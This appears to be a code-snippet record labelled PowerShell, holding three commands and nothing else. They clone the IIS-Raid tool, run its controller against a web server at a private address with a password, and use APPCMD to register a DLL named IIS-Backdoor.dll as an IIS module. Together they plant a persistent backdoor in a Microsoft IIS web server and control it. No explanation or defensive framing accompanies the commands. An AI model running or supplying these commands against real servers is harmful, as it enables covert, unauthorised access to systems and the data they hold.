---
id: dfde2c0c-c3f8-4adf-ba7a-7db6dae076d7
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:27.931278+00:00'
updated_at: '2023-04-10T20:37:21.201766+00:00'
---

# Code Snippet dfde2c0c

**Language**: Powershell

```powershell
$ git clone https://github.com/0x09AL/IIS-Raid
$ python iis_controller.py --url http://192.168.1.11/ --password SIMPLEPASS
C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:Module Name /image:"%windir%\System32\inetsrv\IIS-Backdoor.dll" /add:true
```
